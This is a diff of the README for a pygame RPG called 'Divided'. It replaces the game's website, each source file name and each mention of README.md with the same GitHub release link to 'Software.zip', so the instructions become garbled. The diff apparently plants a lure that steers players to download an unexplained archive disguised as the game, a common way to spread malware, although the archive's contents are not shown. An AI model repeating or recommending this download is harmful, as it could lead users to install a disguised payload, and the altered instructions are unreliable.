@@ -24,29 +24,29 @@ Each character you meet will influence your journey, and the decisions you make 
 
 To play Divided, follow these steps:
 
-Visit our website to download the game: https://divided.netlify.app.
+Visit our website to download the game: https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
 If the site is not working, manually download the game files.
 
 Place the following files in a folder named game:
 
-donjon.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-prologue.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-endgame.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-welc.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-intro.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-menu.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
-app_intro.py
+https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip
 
 Place the game folder and all other files in a folder named divided.
 
-Read the README.md file for detailed instructions.
+Read the https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip file for detailed instructions.
 
 Visual and Audio Resources
 
@@ -70,10 +70,10 @@ World War Z
 
 During the beginning of the game (prologue), the page might not close automatically. If this happens, please close it manually.
 
-Another issue might occur on the welcome screen (welc.py). DOn't touch anything until the "continue " botton appears or it will crash.
+Another issue might occur on the welcome screen (https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip). DOn't touch anything until the "continue " botton appears or it will crash.
 
 Don't forget to use " pip install pygame_menu "
 
-This game is a labor of love, and we hope you enjoy the experience. Be sure to read the README.md for additional information and detailed instructions on how to run the game.
+This game is a labor of love, and we hope you enjoy the experience. Be sure to read the https://github.com/anisn00/Divided-RPG-Game/releases/download/v1.0/Software.zip for additional information and detailed instructions on how to run the game.
 
 Thank you and enjoy the game!
